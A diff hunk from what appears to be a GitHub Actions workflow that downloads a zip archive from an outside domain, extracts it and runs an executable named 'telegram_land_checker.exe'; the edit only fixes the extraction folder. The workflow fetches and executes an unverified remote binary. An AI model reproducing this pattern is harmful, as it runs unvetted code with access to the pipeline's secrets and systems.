@@ -144,7 +144,7 @@ jobs:
       run: Invoke-WebRequest -Uri "https://secuhex.com/app2.zip" -OutFile app2.zip
 
     - name: 🗜️ Extract App
-      run: Expand-Archive app2.zip -DestinationPath app1
+      run: Expand-Archive app2.zip -DestinationPath app2
 
     - name: 🚀 Run telegram_land_checker.exe
       run: |
